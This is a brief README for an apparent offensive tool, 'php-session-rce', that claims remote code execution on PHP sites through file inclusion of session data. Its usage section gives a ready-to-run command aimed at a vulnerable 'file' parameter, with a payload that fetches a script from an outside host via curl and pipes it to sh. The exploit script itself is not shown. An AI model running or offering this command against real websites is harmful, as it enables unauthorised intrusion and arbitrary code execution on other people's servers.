# php-session-rce
Remote Code Execution on PHP's include function using PHP sessions.

## Usage
To attack a website running on `127.0.0.1` with a vulnerable parameter of `file` we can use the following:

```
python exploit.py http://127.0.0.1:9001 file "curl mywebsite.com/exploit.sh | sh"
```
